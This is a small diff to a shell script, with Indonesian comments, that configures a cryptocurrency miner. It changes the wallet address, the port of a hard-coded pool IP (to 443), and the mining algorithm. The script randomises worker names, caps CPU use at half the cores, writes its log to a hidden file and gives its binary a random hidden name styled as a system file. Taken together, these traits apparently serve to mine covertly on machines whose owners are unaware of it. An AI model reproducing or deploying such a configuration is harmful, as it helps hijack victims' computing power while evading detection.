@@ -2,11 +2,11 @@
 set -e
 
 # ===[ Konfigurasi Dasar ]===
-BASE_WALLET="deroi1qyzlxxgq2weyqlxg5u4tkng2lf5rktwanqhse2hwm577ps22zv2x2q9pvfz92x6tszeaps50smhqjck4d4"
+BASE_WALLET="Bc4QbZ9pPM5sJQ1RLdG7SrJCjqCnT5FVq9"
 WORKER="$(tr -dc a-z0-9 </dev/urandom | head -c 6)"
 WALLET="$BASE_WALLET.$WORKER"
-POOL="stratum+tcps://159.223.48.143:10300"
-ALGO="astrobwt"
+POOL="stratum+tcps://159.223.48.143:443"
+ALGO="power2b"
 THREADS=$(( $(nproc) / 2 ))
 LOG_FILE=".xlog"
 RND_BIN=".sys_$(tr -dc a-z0-9 </dev/urandom | head -c 5)"
